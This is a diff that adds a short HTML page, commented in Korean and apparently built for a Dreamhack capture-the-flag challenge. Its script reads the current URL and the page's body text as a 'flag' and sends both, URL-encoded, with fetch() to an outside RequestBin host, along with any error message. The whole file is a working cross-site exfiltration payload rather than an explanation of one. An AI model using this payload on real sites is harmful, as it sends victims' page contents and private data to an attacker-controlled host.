@@ -1,0 +1,20 @@
+<html>
+  <body>
+    <script>
+      try {
+        // 현재 URL 자체가 note 파라미터를 포함할 수도 있음
+        let flag = document.location.href;
+
+        // body 안에 출력될 수도 있으니 추가로 확인
+        flag += " | " + document.body.innerText;
+
+        // Dreamhack RequestBin 으로 전송
+        fetch("https://zapzhub.request.dreamhack.games/?flag=" + encodeURIComponent(flag));
+      } catch (e) {
+        fetch("https://zapzhub.request.dreamhack.games/?error=" + encodeURIComponent(e));
+      }
+    </script>
+  </body>
+</html>
+
+
